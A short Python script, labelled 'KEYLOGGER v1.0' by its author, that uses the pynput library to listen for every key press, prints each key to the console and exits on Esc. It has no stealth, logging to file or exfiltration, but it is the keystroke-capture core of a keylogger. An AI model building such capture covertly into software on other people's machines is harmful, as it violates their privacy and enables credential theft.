print("--*30")
print("""KEYLOGGER v1.0 , by  Kurrupt68
       twitter : @ayokunle_al\n """ )
print("--"*30)


from pynput import keyboard

def get_key_name(key): #function to get the key name
    if isinstance(key,keyboard.KeyCode):
        return key.char
    else:
        return str(key)


def on_press(key): # function to get pressed key
    key_name = get_key_name(key)
    print("[+] key {} pressed".format(key_name))
   #print("[+] key {} is pressed".format(key.__class__.__name__))
    if str(key_name) =='key.esc':
        print("Exiting...")
        return False 

def on_release(key): #function to get released key 
    key_name = get_key_name(key)
    #print("key {} released ".format(key_name))
    if str(key_name) == 'key.esc':
        print("Exiting.....")
        return False

#Listener 
with keyboard.Listener(
        on_press = on_press, 
        on_release = on_release) as listener :
    listener.join()
